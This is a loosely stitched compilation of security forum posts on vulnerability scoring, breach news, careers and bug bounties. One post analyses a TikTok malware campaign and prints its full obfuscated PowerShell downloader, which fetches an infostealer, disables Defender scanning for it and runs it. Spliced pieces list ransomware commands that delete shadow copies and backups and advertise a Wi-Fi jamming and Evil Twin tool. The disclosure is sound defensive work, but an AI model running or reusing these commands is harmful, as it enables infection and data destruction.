"Case Study: Traditional CVSS scoring missed this actively exploited vulnerability (CVE-2024-50302). I came across an interesting case that I wanted to share with r/netsec - it shows how traditional vulnerability scoring systems can fall short when prioritizing vulnerabilities that are actively being exploited.

The vulnerability: CVE-2024-50302

This vulnerability was just added to CISA's KEV (Known Exploited Vulnerabilities) catalog today, but if you were looking at standard metrics, you probably wouldn't have prioritized it:

Base CVSS: 5.5 (MEDIUM)
CVSS-BT (with temporal): 5.5 (MEDIUM)
EPSS Score: 0.04% (extremely low probability of exploitation)

But here's the kicker - despite these metrics, this vulnerability is actively being exploited in the wild.

Why standard vulnerability metrics let us down:

I've been frustrated with vulnerability management for a while, and this example hits on three problems I consistently see:

1. Static scoring: Base CVSS scores are frozen in time, regardless of what's happening in the real world
2. Temporal limitations: Even CVSS-BT (Base+Temporal) often doesn't capture actual exploitation activity well
3. Probability vs. actuality: EPSS is great for statistical likelihood, but can miss targeted exploits

A weekend project: Threat-enhanced scoring

As a side project, I've been tinkering with an enhanced scoring algorithm that incorporates threat intel sources to provide a more practical risk score. I'm calling it CVSS-TE.

For this specific vulnerability, here's what it showed:

Before CISA KEV addition:
- Base CVSS: 5.5 (MEDIUM)
- CVSS-BT: 5.5 (MEDIUM)
- CVSS-TE: 7.0 (HIGH) - Already elevated due to VulnCheck KEV data
- Indicators: VulnCheck KEV

After CISA KEV addition:
- Base CVSS: 5.5 (MEDIUM)
- CVSS-BT: 5.5 (MEDIUM)
- CVSS-TE: 7.5 (HIGH) - Further increased
- Indicators: CISA KEV + VulnCheck KEV

Technical implementation

Since this is r/netsec, I figure some of you might be interested in how I approached this:

The algorithm:
1. Uses standard CVSS-BT score as a baseline
2. Applies a quality multiplier based on exploit reliability and effectiveness data
3. Adds threat intelligence factors from various sources (CISA KEV, VulnCheck, EPSS, exploit count)
4. Uses a weighted formula to prevent dilution of high-quality exploits

The basic formula is: CVSS-TE = min(10, CVSS-BT_Score * Quality_Multiplier + Threat_Intel_Factor - Time_Decay)

Threat intel factors are weighted roughly like this:
- CISA KEV presence: +1.0
- VulnCheck KEV presence: +0.8
- High EPSS (‚â•0.5): +0.5
- Multiple exploit sources present: +0.25 to +0.75 based on count

The interesting part

What makes this vulnerability particularly interesting is the contrast between its EPSS score (0.04%, which is tiny) and the fact that it's being actively exploited. This is exactly the kind of case that probability-based models can miss.

For me, it's a validation that augmenting traditional scores with actual threat intel can catch things that might otherwise slip through the cracks.

I made a thing

I built a small lookup tool at github.io/cvss-te where you can search for CVEs and see how they score with this approach.

The code and methodology is on GitHub if anyone wants to take a look. It's just a weekend project, so there's plenty of room for improvement - would appreciate any feedback or suggestions from the community.

Anyone else run into similar issues with standard vulnerability metrics? Or have alternative approaches you've found useful?‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã"

"Moviepass was part of the attack on twitter / X recently. got insight! Idk which sub to post this but here: 

Moviepass is part of the cyber attack. 

So, I had Moviepass when it was live, years ago. Throughout last yesr and this yesr I‚Äôd get emails from them. Something bc about an updated version. I didn‚Äôt think much of it. Asked me to sign up for a new version of it as like only the first X number of ppl can. I clicked the link I. The email.

Problem is, my guards went up when they asked me to click on the email again. Keep in mind this whole time thr emails are coming from legit address. 

You k ow how if if hold the button down it gives a preview of the web address? When I did rhis, thr website was all sorts of random characters like fkgh2454dghh. And it was super long. It wasn‚Äôt for the previous time I clicked. 

Then the teitter attack happened. 

Then my email app (or my email provider?) logged me out the email. It kept telling me to sign back in. 

So, yeah. Thru Moviepass they tried. If you go to Moviepass subreddit, there‚Äôs stuff about MP trying to relaunch a new version recently etc. 

I think going forward thr best attacks will come from inside established companies or ones that have went under or trying to survive. 

Thet tried hard. Like iver the course of last year they are hyping up a new version of Moviepass and like ‚Äúlimited sign up so hurry before the period ends!‚Äù

I didn‚Äôt continue once I saw all those random characters, but Msybe it was too late. 

Just giving my experience. I‚Äôll post this in a couple more subs as I have t seen anyone talk about this."

"California Cryobank Hacked ‚Äì Sensitive Customer Data Exposed. **California Cryobank LLC has confirmed a data breach that compromised sensitive personal information of its customers.**

**Key Points:**

* Data breach occurred on April 20, 2024, undetected until October 4, 2024.
* Over 28 Maine residents confirmed affected, estimates suggest thousands may be involved.
* The breach involved a zero-day vulnerability allowing persistent unauthorized access.
* Exposed data includes names and sensitive reproductive and genetic information.
* Complimentary credit monitoring and identity theft protection offered to affected individuals.

The data breach at California Cryobank has raised serious concerns due to its timing and the sensitivity of the data involved. Occurring on April 20, 2024, the breach remained unchecked for nearly six months, revealing a significant lapse in data security responsible for safeguarding personal identifiable information. The company discovered that cybercriminals exploited a zero-day vulnerability in their client management system, allowing them to maintain access to sensitive databases for an estimated 12 hours before being detected. Costly ramifications follow, with estimates suggesting that the actual number of impacted clients could potentially reach into the thousands given the breadth of California Cryobank's clientele across North America.

The implications of this breach are particularly troubling, as the information compromised includes not just names but also reproductive and genetic data that can have far-reaching effects on individuals' privacy. With breaches of this nature becoming more common in healthcare and reproductive technology sectors, experts warn that such organizations are increasingly attracting sophisticated threat actors. In response, California Cryobank has taken steps to enhance their security protocols, including new encryption measures and the introduction of multi-factor authentication, while offering affected clients access to credit monitoring and identity theft protection services. They are also actively cooperating with law enforcement and have set up a dedicated call center to provide support to concerned customers as they navigate this distressing situation.

What steps do you think companies in the healthcare sector should take to improve their data security?

"TikToker @TheShellShield Is Spreading VIDAR Malware Through Fake Free Software Tutorials. I recently discovered that a TikToker, @TheShellShield, has been making multiple videos claiming to offer free software like Spotify Premium through a PowerShell command. However, this is actually a malware distribution campaign that installs the VIDAR infostealer onto victims‚Äô machines.

How the Scam Works:
	1.	The TikTok videos instruct users to run a PowerShell command:

iwr ‚Äú(ProgramName).keytool.cc‚Äù | iex

	‚Ä¢	The domain changes based on the software being ‚Äúoffered.‚Äù

	2.	This downloads a .ps1 (PowerShell script) onto the user‚Äôs machine.
	3.	The script decodes a Base64-encoded URL, revealing:

azsolver.com/files/main.exe

	‚Ä¢	This main.exe file is VIDAR malware.

	4.	The script then:
	‚Ä¢	Moves main.exe to Local AppData
	‚Ä¢	Hides the file and adds it as an exclusion in Windows Defender
	‚Ä¢	Runs the malware
	‚Ä¢	Displays an error message:

An error occurred during activation. Please try again.


	5.	Victims are unaware that their system is now infected with an infostealer or RAT (Remote Access Trojan).

Signs of Infection:
	‚Ä¢	People in the comments are reporting activation errors, to which @TheShellShield responds with misleading troubleshooting questions (e.g., ‚ÄúWhat version of Windows are you on?‚Äù).

Evidence & Actions Taken:
	‚Ä¢	Azsolver.com itself is not inherently malicious, but azsolver.com/files/main.exe is being used to distribute malware.
	‚Ä¢	VirusTotal has flagged this executable as malware (VIDAR Infostealer).
	‚Ä¢	I‚Äôve messaged the owner of azsolver.com to warn them about their site being used for malware distribution.
	‚Ä¢	I reported @TheShellShield to TikTok, but my takedown request was denied.

"Fake Software activation Malware. I have very recently come across a TikTok (user: theshellshield ) account claiming to be able to activate certain software. I knew that this was nonsense. It was clear that it was relying on people  who did not know what they were doing typing stuff into the PowerShell and running it. The videos led the user to type `iwr ""windows.keytool.cc | iex` which downloaded and ran a script.

To see what was happening here I loaded up a Linux VM and used `iwr ""windows.keytool.cc"" -OutFile ""/home/user/output.txt""` to have a look at the code.

Here is what i got:

    $downloadUrlB64 = ""aHR0cHM6Ly9henNvbHZlci5jb20vZmlsZXMvbWFpbi5leGU=""

    $directoryB64 = ""RGlyZWN0b3J5""
    $runAsB64 = ""UnVuQXM=""
    
    $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
    $updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
    $hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
    $silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
    $stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
    $directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
    $runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))
    
    $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
    New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
    
    $tempPath = Join-Path $hiddenFolder $updaterExe
    
    function Add-Exclusion {
        param ([string]$Path)
        try {
            Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
        } catch {}
    }
    
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
        Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
        Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
        Add-Exclusion -Path $tempPath
        Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait
        Remove-Item $hiddenFolder -Recurse -Force
    } catch {
        exit 1
    } finally {
        Write-Host ""An error occurred during activation. Please try again.""
    }

After decoding the base64 I got these values for the varibles

|Variable|Variable|Decoded Value|
|:-|:-|:-|
|$downloadUrlB64|aHR0cHM6Ly9henNvbHZlci5jb20vZmlsZXMvbWFpbi5leGU=|[https://azsolver.com/files/main.exe](https://removed)|
|$updaterExeB64|dXBkYXRlci5leGU=|updater.exe|
|$hiddenAttrB64|SGlkZGVu|Hidden|
|$silentlyContinueB64|U2lsZW50bHljb250aW51ZQ==|SilentlyContinue|
|$stopActionB64|U3RvcA==|Stop|
|$directoryB64|RGlyZWN0b3J5|Directory|
|$runAsB64|UnVuQXM=|RunAs|

^(Note: I have removed the clickability of the link so you don't accidently download the file)

I now know what this script does.

1. Decodes the base64 to get the values above
2. It generates a folder in the `LocalAppData` directory using a random GUID `$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString()) New-Item -ItemType $directory -Path $hiddenFolder | Out-Null`
3. Downloads a suspicious File from [https://azsolver.com/files/main.exe](https://removed) and saves it as `updater.exe`  `Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction`
4. Modifies the File and Folder attributes to mark them as hidden `Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr`
5. Tries to get around Windows defender by attempting to exclude from the scanning (At least that's what I thinks its doing) `function Add-Exclusion { param ([string]$Path) try { Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue } catch {} } Add-Exclusion -Path $tempPath`
6. Executes `updater.exe`  with Administrator  privileges while keeping window hidden `Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait`
7. Deletes the evidence by removing the hidden folder `Remove-Item $hiddenFolder -Recurse -Force`
8. If anything fails, display fake error message `Write-Host ""An error occurred during activation. Please try again.""`

To conclude, I hope that this has brought some attention to it and that someone can help me get the account taken down. If anybody knows what happens with the exe after it runs please let me know as i am interested and not skilled enough to find out. Also feel free to suggest any ways i could of written this post better and or any errors i have made as this is the first time i have done this before.

Thank you for reading.

`vssadmin delete shadows /all /quiet`: Deletes all Volume Shadow Copies without displaying any prompts

`wmic shadowcopy delete`: Deletes shadow copies using Windows Management Instrumentation.

`bcdedit /set {default} bootstatuspolicy ignoreallfailures`: Modifies the boot configuration to ignore failures. This can disable certain recovery options.

`bcdedit /set {default} recoveryenabled no`: Disables Windows recovery mode.

`wbadmin delete catalog -quiet`: Deletes the backup catalog, which prevents restoring from backups.

The process queried numerous registry keys related to:

* **Windows Explorer settings**
* **File associations (**`.inf`**,** `.log`**,** `.sys`**)**
* **Internet settings**
* **Shell folders**

They indicate that the process was gathering system information, these registry queries alone are not inherently malicious.

However it's clear as day that this process is dangerous, and taking a closer inspection shows multiple files with the **.lockbit** extension were listed under the Eclipse plugins directory, this small segment provides enough information about the process and its behavior. 

The log file exceeds several MBs in size due to the sheer amount activity and damage this ransomware caused.

**Volume Shadow Copies** is an underutilized tool that is capable of restoring encrypted files which is the reason why most ransomware disable it in order to prevent recovery.

Many antiviruses like Kaspersky, OmniDefender, BitDefender are capable of blocking these malicious behaviors and restore encrypted files to their original state."
"Feeling kind of stuck. Need some guidance !. So I'm currently in my 3rd year of my 4 year course in college, and I‚Äôd say I'm somewhere in the middle when it comes to reverse engineering and malware analysis ( mostly comfortable with all the stuff, have worked with real samples like emotet, Snake, and wannacry too (not finished)). I've explored somewhat most of the tech (Ai, ml, webdev) and I‚Äôve done quite a bit of exploit dev on both Linux and Windows too, and I regularly work and make open source tools and do low-level programming. It‚Äôs been fun and definitely helped me connect dots, and build a bigger picture of security. But man, every time I look for jobs in exploit dev, reversing or malware research as an fresher or even beginner, all I see are few results that also require 5+ years of experience, and I haven't even done an internship yet.

So, I'm stuck. Where do I even start? I feel like all this knowledge might not be useful if I can‚Äôt find a way to turn it into a career. It‚Äôs frustrating when I see friends in web dev landing jobs easily after grinding leetcode ( I‚Äôve also done some web development, so I‚Äôm comfortable with those stacks too but you know....), while I‚Äôm over here working on this stuff and unsure where to go next.

Sorry for the long post, but I‚Äôd really appreciate any advice or guidance. I'm in real need of that. I wonder if I'm making a fool out of me asking this in public but yeah... Thanks in advance!

"Go beyond CVSS scores. When a new critical vulnerability appears, don't just react to the score. Take CVE-2025-24813 (Tomcat) as an example:

 Look at the Scores: Start with CVSS and EPSS CVE-2025-24813 had a 9.8 CVSS and 99th percentile EPSS ‚Äì high severity, actively exploited.

 Read the Description: Understand how it works. What conditions are needed? 

For CVE-2025-24813, the key was a specific non-default Tomcat configuration requirement. 
We found a blog post detailing the exact Tomcat setting to search for. We searched our version control to see if that specific configuration was enabled anywhere. It wasn‚Äôt. So while it was a critical it appeared that it presented zero risk to us. 

If you have a threat intel group or service (like Mandiant), check their assessment. Mandiant rated CVE-2025-24813 as aMedium, due to the uncommon non-default configuration.
This multi-step approach gives a far more accurate picture of your actual risk than relying on scores alone.

"Have any of you tried ProxyReaper?. Hi Black Hats and Black Cats

Does it always annoy you that proxy lists published on GitHub stop working shortly after publication and you then have to test the 1000 proxies? This annoyed me a lot, so I wrote a little tool that automates the whole thing. Have a look at it and tell me what could be improved.

Proxy Reaper is a powerful tool for checking proxy servers for availability, speed and anonymity. It supports various protocols such as HTTP, HTTPS, SOCKS4 and SOCKS5 and offers advanced features to efficiently manage and check proxies. You can even use it to test direct source from GitHub and could also run it cron to automate it.

Give me your feedback and wishes. And if you think it's cool you can buy me a coffee.

"HackerOne is Ghosting.. Hello hacker friends. My experience so far with HackerOne has been pretty poor. I reported an ATO exploit that chained XSS with 3 other vulnerabilities, but it was closed as a duplicate and linked to a year old report.

I don‚Äôt think it is ethical to knowingly leave a critical vulnerability unpatched for such an extended period, and HackerOne does not feel like an honest platform. To avoid paying out bounties, they can just link all future XSS vulnerabilities to the previous report indefinitely because there is no accountability.

The same program claimed to accept subdomain takeovers.¬†[target.com](http://target.com/)¬†is in scope. They reject a takeover on¬†[xyz.target.com](http://xyz.target.com/)¬†due to scope, because it does not explicitly include any wildcards.

I have reported other issues too, but there is always an excuse. While some of the triagers on the platform have done a fantastic job, I suspect others are sharing vulnerabilities with each other. Many of my comments have gone unanswered for months, and my email message was ignored. New accounts on the platform cannot request mediation, thus making it impossible to communicate.

I‚Äôm over it. They can keep the bounties, but please fix the vulnerabilities so that millions of users are not jeopardized. I have no idea if the company on HackerOne is even aware of these vulnerabilities and when they intend to fix them. Writing articles on Medium detailing these exploits could also improve my chances of landing a job, but it is impossible to request disclosure ethically when the triagers ghost you. It feels like HackerOne cares more about the monetization of its platform than actually helping customers."

"The hackers got hacked: Everest ransomware gang's site goes dark. Criminals become victims of crime. Over the weekend, the group's dark web leak site was defaced and is now completely offline. An unknown attacker replaced the website's contents with a sarcastic note: ""Don't do crime CRIME IS BAD xoxo from Prague."" It's still unclear how the site was taken over, but security researcher Tammy Harper suspects it was vulnerable to a WordPress flaw that could have led to the compromise.

The Everest gang has been active for at least five years and has listed over 230 victims on their leak site, focusing on healthcare organizations in the US. Most recently, they had started shifting to a more traditional ransomware model, encrypting files in addition to data theft.

For now, their main platform for extortion is down. Whether they'll resurface elsewhere remains to be seen."
"Which vendor certification is more marketable for security operations analyst; Splunk,  Microsoft‚Äôs SC-200, or Cisco Cybersecurity Associate. I have limited hands-on experience with both Splunk and Microsoft Defender and Sentinel. I have no experience with Cisco security. My Splunk experience comes from doing projects. My experience with MS Defender and Sentinel is a mix of projects and work. 

People often say go with what your org uses. My current employer is a global company. The security operations team uses Defender and Sentinel, but this team is managed by a company called TCS. In fact, we use TCS for all level one support. We do have FTEs that are incident responders but that‚Äôs not a role I would be able to pivot into. My employer does have other security teams but getting on those teams are slim as well. For me to get a cybersecurity role, chances are that I‚Äôll have to break away from my employer.

I was thinking about breaking in via IAM since I have more work experience in this, but I find setting up IAM projects rather tedious. The fun part of IAM for me is the technical work and IAM projects seem to be a mix of GRC and technical work. 

Security analysts projects on the other hand have been fun and exciting from the get go so I think this would be a better fit for me. And thus, the above question. If it helps, I have years of experience in IT. I‚Äôve done service desk, help desk, Intune administration and systems administration. I think adding a SIEM and/ SOAR certification to my resume along with the projects I‚Äôve done would improve my chances.

"Redirected to malicious domain, somehow surpassed browser guard.. Hello everybody,

About a month ago I tried to visit a well known streaming site that I always use. This site has no ads or popups and is generally well trusted. As I typed in the URL and hit enter I got redirected to 'cibago. com/\[random string of letters and numbers\]', then after quickly being redirected to several subdomains I finally landed on the TotalAV product page.

I thought it was weird that TotalAV would be advertising on a piracy website so I went in to my history and clicked the original cibago link I was redirected to, and this time my malwarebytes browser guard blocked it as a phishing link, but for some reason the first time it did not!

I did some research on the domain and literally every resource said the domain was suspicious. [Right here](https://otx.alienvault.com/indicator/file/b1b8951dabe9c42355b347715cd1b0c9cda9652401953c231621c85a3115a0b1) is and [here](https://otx.alienvault.com/indicator/domain/cibago.com) the is the domain on LevelBlue OTX and as you can see it is definitely associated with ransomware and other malware. On the former link it seems that you can see the whole redirect chain, ending on [www.TotalAV.com](http://www.TotalAV.com). [Here](https://www.virustotal.com/gui/domain/cibago.com) you can see the domain is also flagged by 6 vendors on virus total, but they don't specify anything.

I made an any.run account and tried running the domain to see if I can see any drive-by downloads and such, but I just don't have the expertise to understand what I'm seeing. I've since run HitmanPro, Malwarebytes etc. and my device seems clean, but we all know how easy it is to evade antivirus. I also had brave shields on at the time, but I didn't have scripts blocked or anything because it breaks websites, and somehow this redirect evaded my browser guard the first time so who knows.

So my questions are:

1. Why didn't my browser guard stop this the first time?
2. This domain is associated with malware, should I be worried about drive-by downloads?
3. If drive-by downloads are associated with this domain, then there may be a ticking time bomb waiting on my PC.... What do?

If anybody who has access to any.run, JoeSandbox or any other analysis tool that actually knows what to look for would be able to run the associated domains to analyze for script injection or drive-by downlaods, that would be much appreciated!! I can't stop thinking about how I was on this clearly suspicious ransomware domain, and that my computer may be actively infected.

Thanks to anybody who's able to help and please let me know if you find anything!

My org current uses the bishop fox attack surface monitoring service and while good we have found things they are missing.

So we want something that will complement that well. Focused on discovering exploitable vulnerabilities on our internet facing attack surface. Are there any other options we should be considering? "

I bought the boards and began experimenting. Now, after more than 3000 lines of code, I can finally say that Radiosphere is usable. It might have a few bugs here and there, but nothing major.    
     
The road wasn‚Äôt easy ‚Äî I burned 2 ESP32 boards, 2 ESP8266s, an Arduino Mega, and even a screen ‚Äî but it was absolutely worth it.

Radiosphere is a multi-purpose wireless attack tool capable of:     
     
-Jamming Wi-Fi, Bluetooth, drones, and basically anything using the 2.4GHz band.      
-Performing deauthentication and Evil Twin attacks.     
-Spamming fake networks (even custom lists).

"SOC Analyst Inquiry: Part 2. I made a post the other day asking which SIEM certification I should go with; Splunk, SC-200 or Cisco‚Äôs Security Associate. 

I want to thank every one who provided me their opinions. I greatly appreciate it. It seemed that most people who responded went with Splunk but SC-200 was a close second. I saw a couple of comments that stated that Cisco was definitely a no go for security. I think out of the three, I‚Äôm going to do both Splunk and SC-200. Too much knowledge is never a bad thing right?

After thinking of all this and my career end goal, which is security engineering within cloud or DevSecOps, I forgot to add the AWS Security Specialty certification to the poll. Now, this isn‚Äôt a certification one would typically get for a Security Operations Analyst role, but I‚Äôm wondering‚Äîwould being familiar with AWS security be a good thing for a SOC analyst, or is that going a bit overboard? For those of you who are in SOC or cloud security, how often do you deal with AWS security? Is your environment one of AWS, Azure, Google Cloud, multi-cloud, hybrid, or do you use a lot of third party security solutions.
